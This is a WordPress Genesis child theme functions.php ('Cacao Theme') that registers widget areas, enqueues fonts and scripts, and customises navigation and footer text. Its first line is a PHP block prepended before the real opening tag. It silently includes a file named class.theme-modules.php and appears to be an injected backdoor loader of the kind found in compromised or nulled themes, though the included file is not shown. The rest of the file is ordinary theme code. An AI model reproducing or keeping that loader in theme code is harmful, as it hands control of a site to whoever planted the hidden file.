<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
//* Start the engine
include_once( get_template_directory() . '/lib/init.php' );

//* Add Image upload and Color select to WordPress Theme Customizer
require_once( get_stylesheet_directory() . '/lib/customize.php' );

//* Include Customizer CSS
include_once( get_stylesheet_directory() . '/lib/output.php' );

//* Child theme (do not remove)
define( 'CHILD_THEME_NAME', __( 'Cacao Theme', 'cacao' ) );


//* Add HTML5 markup structure
add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list', 'gallery', 'caption' ) );

//* Add viewport meta tag for mobile browsers
add_theme_support( 'genesis-responsive-viewport' );

//* Load main style sheet after WooCommerce */

add_action( 'wp_enqueue_scripts', 'genesis_remove_scripts' );
function genesis_remove_scripts() 
{
    wp_dequeue_style( 'genesis-child' );
}

add_action( 'wp_enqueue_scripts', 'genesis_move_scripts', 999 );
function genesis_move_scripts() 
{
    if ( is_child_theme() ) :
        wp_enqueue_style( 'genesis-child', get_stylesheet_uri(), true, filemtime( get_stylesheet_directory() . '/style.css' ), 'all' );
    endif;
}

remove_action( 'woocommerce_sidebar', 'woocommerce_get_sidebar', 10 );
add_action( 'woocommerce_sidebar', 'custom_sidebar', 10 );

// enqueue Dashicons
add_action( 'wp_enqueue_scripts', 'wdm_enqueue_dashicons' );
function wdm_enqueue_dashicons() {
     wp_enqueue_style( 'ss-dashicons-font', get_stylesheet_directory_uri(), array('dashicons'), '1.0' );
}

// Load Font Awesome
add_action( 'wp_enqueue_scripts', 'enqueue_font_awesome' );
function enqueue_font_awesome() {

	wp_enqueue_style( 'font-awesome', '//maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css' );

}

// Enqueue scripts and styles
add_action( 'wp_enqueue_scripts', 'custom_scripts_styles_mobile_responsive' );
function custom_scripts_styles_mobile_responsive() {

	wp_enqueue_script( 'studios-responsive-menu', get_stylesheet_directory_uri() . '/js/responsive-menu.js', array( 'jquery' ), '1.0.0' );
	wp_enqueue_style( 'dashicons' );

}

//* Remove the header right widget area
unregister_sidebar( 'header-right' );

remove_action( 'genesis_after_header', 'genesis_do_nav' );
add_action( 'genesis_before_header', 'genesis_do_nav' );

//* Reposition the secondary navigation menu
remove_action( 'genesis_after_header', 'genesis_do_subnav' );
add_action( 'genesis_footer', 'genesis_do_subnav', 7 );

//* Reduce the secondary navigation menu to one level depth
add_filter( 'wp_nav_menu_args', 'studios_secondary_menu_args' );
function studios_secondary_menu_args( $args ){

	if( 'secondary' != $args['theme_location'] )
	return $args;

	$args['depth'] = 1;
	return $args;

}

//* Customize the Gravatar size in the entry comments
add_filter( 'genesis_comment_list_args', 'bg_comments_gravatar' );
function bg_comments_gravatar( $args ) {
	$args['avatar_size'] = 96;
	return $args;
}

//* Register Homepage Widget Areas

genesis_register_sidebar( array(
	'id'          => 'home-section-1',
	'name'        => __( 'Home - section-1', 'cacao' ),
	'description' => __( 'This is the home featured section of the homepage.', 'cacao' ),
) );

genesis_register_sidebar( array(
	'id'          => 'home-section-2',
	'name'        => __( 'Home - section-2', 'cacao' ),
	'description' => __( 'This is the home featured section of the homepage.', 'cacao' ),
) );

genesis_register_sidebar( array(
	'id'          => 'home-section-3',
	'name'        => __( 'Home - section-3', 'cacao' ),
	'description' => __( 'This is the home featured section of the homepage.', 'cacao' ),
) );

genesis_register_sidebar( array(
	'id'          => 'home-section-4',
	'name'        => __( 'Home - section-4', 'cacao' ),
	'description' => __( 'This is the home featured section of the homepage.', 'cacao' ),
) );

//* Register Salespage widgets 

genesis_register_sidebar( array(
	'id'          => 'salespage-one',
	'name'        => __( 'Salespage 1', 'cacao' ),
	'description' => __( 'This is the salespage-one widget-area.', 'cacao' ),
) );

genesis_register_sidebar( array(
	'id'          => 'salespage-two',
	'name'        => __( 'Salespage 2', 'cacao' ),
	'description' => __( 'This is the salespage-two widget-area.', 'cacao' ),
) );

genesis_register_sidebar( array(
	'id'          => 'salespage-three',
	'name'        => __( 'Salespage 3', 'cacao' ),
	'description' => __( 'This is the salespage-three widget-area.', 'cacao' ),
) );

genesis_register_sidebar( array(
	'id'          => 'salespage-four',
	'name'        => __( 'Salespage 4', 'cacao' ),
	'description' => __( 'This is the salespage-four widget-area.', 'cacao' ),
) );

genesis_register_sidebar( array(
	'id'          => 'salespage-five',
	'name'        => __( 'Salespage 5', 'cacao' ),
	'description' => __( 'This is the salespage-five widget-area.', 'cacao' ),
) );

genesis_register_sidebar( array(
	'id'          => 'salespage-six',
	'name'        => __( 'Salespage 6', 'cacao' ),
	'description' => __( 'This is the salespage-six widget-area.', 'cacao' ),
) );


//* Enqueue Asap + Open Sans Google font
add_action( 'wp_enqueue_scripts', 'sp_load_google_fonts' );
function sp_load_google_fonts() {
	wp_enqueue_style( 'google-font-open+sans|Asap', '//fonts.googleapis.com/css?family=Asap:400,500|Open+Sans:300,400,600', array(), CHILD_THEME_VERSION );
}

//* Add support for custom header
add_theme_support( 'custom-header', array(
	'width'           => 300,
	'height'          => 300,
	'flex-width'      => false,
	'flex-height'     => false,
	'header-selector' => '.site-title a',
	'header-text'     => false,
) );

/** Add Featured Image Size */
add_image_size( 'featured-image', 500, 500, true );
add_image_size( 'page-featured-image',1200,600,true);

//* Register widget areas
genesis_register_sidebar( array(
	'id'          => 'after-entry',
	'name'        => __( 'Call To Action', 'studios' ),
	'description' => __( 'This is the after entry section.', 'studios' ),
) );
//* Hooks after-entry widget area to single posts
add_action( 'genesis_entry_footer', 'studios_after_entry_widget'  ); 
function studios_after_entry_widget() {
    if ( ! is_singular( 'post' ) )
    	return;
    genesis_widget_area( 'after-entry', array(
		'before' => '<div class="after-entry widget-area"><div class="wrap">',
		'after'  => '</div></div>',
    ) );
}

// Register Instagram widget area.
genesis_register_sidebar( array(
	'id'          => 'instagram',
	'name'        => __( 'Instagram', 'cacao' ),
	'description' => __( 'This is the instagram widget area.', 'cacao' ),
) );

// Add Instagram widget before footer.
add_action( 'genesis_before_footer', 'sp_instagram_feed_widget' );
function sp_instagram_feed_widget() {
	genesis_widget_area( 'instagram', array(
		'before' => '<div class="instagram"><div class="wrap">',
		'after'  => '</div></div>',
	) );
}

//* Add support for 3-column footer widgets
add_theme_support( 'genesis-footer-widgets', 3 );

//* Change the footer text
add_filter('genesis_footer_creds_text', 'sp_footer_creds_filter');
function sp_footer_creds_filter( $creds ) {
	$creds = '[footer_copyright]  <a href="http://exempel.se/"> MY OWN WEBSITE </a>';
	return $creds;
}